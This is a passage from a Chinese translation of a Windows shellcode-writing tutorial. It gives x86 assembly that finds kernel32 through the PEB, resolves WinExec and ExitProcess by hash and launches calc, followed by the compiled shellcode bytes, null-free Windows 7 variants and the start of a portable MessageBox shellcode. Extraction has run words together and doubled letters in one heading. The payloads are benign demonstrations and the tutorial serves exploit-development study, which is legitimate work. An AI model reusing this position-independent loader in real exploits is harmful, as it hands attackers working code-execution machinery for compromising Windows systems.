ret
;=======Function:Getpointertocommandtoexecute============
GetArgument: ; Define label for location of winexec argument string
callArgumentReturn ;callreturnlabelsothereturnaddress
;(locationofstring)ispushedontostack
db"calc" ;Writetherawbytesintotheshellcode
;thatrepresentourstring.
db0x00 ;Terminateourstringwithanullcharacter.
;=======Function:Getpointerstofunctionhashes============
GetHashes:
callGetHashesReturn
;WinExec hash:0x98FE8A0E
db0x98
db0xFE
db0x8A
db0x0E
;ExitProcess hash=0x7ED8E273
db0x7E
db0xD8
db0xE2
db0x73
;================================================================
;===================MAINAPPLICATION============================
;================================================================
start_main:
subesp,0x08 ;allocatespaceonstacktostore2functionaddresses
;WinExecandExitProc
movebp,esp ;setebpasframeptrforrelativeoffset
;sowewillbeabletodothis:
;callebp+4 =ExecuteWinExec
;callebp+8 =ExecuteExitProcess
callfind_kernel32
movedx,eax ;savebaseaddressofkernel32inedx
jmpGetHashes ;getaddressof WinExechash
GetHashesReturn:
popesi ;getpointertohashintoesi
leaedi,[ebp+0x4] ;wewillstorethefunctionaddressesatedi
;(ediwillbeincreasedwith0x04foreachhash)
;(seeresolve_symbols_for_dll)
movecx,esi
addecx,0x08 ;storeaddressoflasthashintoecx
callfind_funcs_for_dll ;getfunctionpointersforallhashes
;andputthematebp+4andebp+8
jmpGetArgument ;jumptothelocation
;oftheWinExecargumentstring
ArgumentReturn: ;Definealabeltocallsothat
;stringaddressispushedonstack
popebx ;ebxnowpointstoargumentstring
;nowpushparameterstothestack
xoreax,eax ;zeroouteax
pusheax ;put0onstack
pushebx ;putcommandonstack
call[ebp+4] ;callWinExec
xoreax,eax
pusheax
call[ebp+8]
Q：为什么main函数在底部而函数在顶部？
A：好的，后跳转=>避免null字节。因此如果你能减少前跳的次数，你就不用处理那么多的null字节
编译然后转化成字节：
C:\shellcode>"c:\Program Files\nasm\nasm.exe" c:\shellcode\lab1\calc.asm -o
c:\shellcode\calc.bin
C:\shellcode>perlpveReadbin.plcalc.bin
Readingcalc.bin
Read215bytes
"\xe9\x9a\x00\x00\x00\x56\x31\xf6"
"\x64\x8b\x46\x04\x8b\x40\xe4\x48"
"\x66\x31\xc0\x66\x81\x38\x4d\x5a"
"\x75\xf5\x5e\xc3\x60\x8b\x6c\x24"
"\x24\x8b\x45\x3c\x8b\x54\x05\x78"
"\x01\xea\x8b\x4a\x18\x8b\x5a\x20"
"\x01\xeb\xe3\x37\x49\x8b\x34\x8b"
"\x01\xee\x31\xff\x31\xc0\xfc\xac"
"\x84\xc0\x74\x0a\xc1\xcf\x0d\x01"
"\xc7\xe9\xf1\xff\xff\xff\x3b\x7c"
"\x24\x28\x75\xde\x8b\x5a\x24\x01"
"\xeb\x66\x8b\x0c\x4b\x8b\x5a\x1c"
"\x01\xeb\x8b\x04\x8b\x01\xe8\x89"
"\x44\x24\x1c\x61\xc3\xad\x50\x52"
"\xe8\xa7\xff\xff\xff\x89\x07\x81"
"\xc4\x08\x00\x00\x00\x81\xc7\x04"
"\x00\x00\x00\x39\xce\x75\xe6\xc3"
"\xe8\x3c\x00\x00\x00\x63\x61\x6c"
"\x63\x00\xe8\x1c\x00\x00\x00\x98"
"\xfe\x8a\x0e\x7e\xd8\xe2\x73\x81"
"\xec\x08\x00\x00\x00\x89\xe5\xe8"
"\x59\xff\xff\xff\x89\xc2\xe9\xdf"
"\xff\xff\xff\x5e\x8d\x7d\x04\x89"
"\xf1\x81\xc1\x08\x00\x00\x00\xe8"
"\xa9\xff\xff\xff\xe9\xbf\xff\xff"
"\xff\x5b\x31\xc0\x50\x53\xff\x55"
"\x04\x31\xc0\x50\xff\x55\x08";
正如我们期望的那样，这个代码在XPSP3下工作地很好...
但是在Windows7下它工作不了。
为了来使它也能在Windows7下工作，我们所要做的就是将整个的find_kernel32函数替换
成这样：
（大小：22字节，5null字节）
find_kernel32: xoreax,eax ;cleareax
moveax,[fs:0x30] ;getapointertothePEB
moveax,[eax+0x0C];getPEB->Ldr
moveax,[eax+0x14];getPEB->Ldr.InMemoryOrderModuleList.Flink
;(1stentry)
moveax,[eax] ;getthenextentry(2ndentry)
moveax,[eax] ;getthenextentry(3rdentry)
moveax,[eax+0x10];getthe3rdentriesbaseaddress
;=kernel32.dll
ret
再试一遍：
（感谢Richardo的测试）
因此如果你想用这种技术（可以在Win7下工作的），你需要使它是没有null字节的，然后
一个可行的方案是这样的：
（大小：28字节，null字节：无）
pushesi ;saveesi
xoreax,eax ;cleareax
xorebx,ebx ;clearebx
movbl,0x30 ;setebxto30
moveax,[fs:ebx] ;getapointertothePEB
moveax,[eax+0x0C];getPEB->Ldr
mov eax, [ eax + 0x14 ] ; get
PEB->Ldr.InMemoryOrderModuleList.Flink ;(1stentry)
pusheax
popesi
moveax,[esi] ;getthenextentry(2ndentry)
pusheax
popesi
moveax,[esi] ;getthenextentry(3rdentry)
moveax,[eax+0x10];getthe3rdentriesbaseaddress
;(kernel32.dll)
popesi ;recoveresi
将所有东西组合在一起第 2222 部分：可移植的 MMMMeeeessssssssaaaaggggeeeeBBBBooooxxxx sssshhhheeeellllllllccccooooddddeeee
让我们更进一步，我们将把MessageBoxshellcode转化为一种更通用的版本，能够在各
种Windows版本中工作。当写这个shellcode时，我们需要做：
找到kernel32的基地址
找到kernel32.dll中的LoadLibraryA和ExitProces（s 将会找函数的哈希值和将函数的指
针写入堆栈中的循环）
加载user32.dll（ LoadLibraryA指针必须在栈中，因此只要一个指向“user32.dll”的
字符串指针作为参数，然后调用LoadLibraryA这个API）。事实上，user32.dll的地址将会在
eax中
将MessageBoxA的参数入栈然后调用MessageBox（指针还是在eax中，因此调用eax
就行了）
退出
代码应该是这样的：
;SampleshellcodethatwillpopaMessageBox
;withcustomtitleandtext
;WrittenbyPeterVanEeckhoutte
;http://www.corelan.be:8800
[Section.text]
[BITS32]
global_start
_start:
jmpstart_main
;===========FUNCTIONS=============
;=======Function:GetKernel32baseaddress============
;Technique:PEBInMemoryOrderModuleList
find_kernel32:
xoreax,eax ;clearebx
moveax,[fs:0x30] ;getapointertothePEB
moveax,[eax+0x0C] ;getPEB->Ldr
moveax,[eax+0x14] ;getPEB->Ldr.InMemoryOrderModuleList.Flink(1stentry)
moveax,[eax] ;getthenextentry(2ndentry)
moveax,[eax] ;getthenextentry(3rdentry)
moveax,[eax+0x10] ;getthe3rdentriesbaseaddress(kernel32.dll)
ret
;=======Function:Findfunctionbaseaddress============
find_function:
pushad ;saveallregisters
movebp, [esp + 0x24] ;putbaseaddressofmodulethatisbeing
;loadedinebp
moveax, [ebp + 0x3c] ;skipoverMSDOSheader
movedx, [ebp + eax + 0x78];gotoexporttableandputrelativeaddress
;inedx
addedx, ebp ;addbaseaddresstoit.
;edx=absoluteaddressofexporttable
movecx, [edx + 0x18] ;setupcounterECX
;(howmanyexporteditemsareinarray?)
movebx, [edx + 0x20] ;putnamestablerelativeoffsetinebx
addebx, ebp ;addbaseaddresstoit.
;ebx=absoluteaddressofnamestable
find_function_loop:
jecxz find_function_finished ;ifecx=0,thenlastsymbolhasbeenchecked.
;(shouldneverhappen)
;unlessfunctioncouldnotbefound
dececx ;ecx=ecx-1
movesi, [ebx + ecx * 4] ;getrelativeoffsetofthenameassociated
;withthecurrentsymbol
;andstoreoffsetinesi
addesi, ebp ;addbaseaddress.
;esi=absoluteaddressofcurrentsymbol
compute_hash:
xoredi, edi ;zerooutedi
xoreax, eax ;zeroouteax
cld ;cleardirectionflag.
;willmakesurethatitincrementsinsteadof
;decrementswhenusinglods*
compute_hash_again:
lodsb ;loadbytesatesi(currentsymbolname)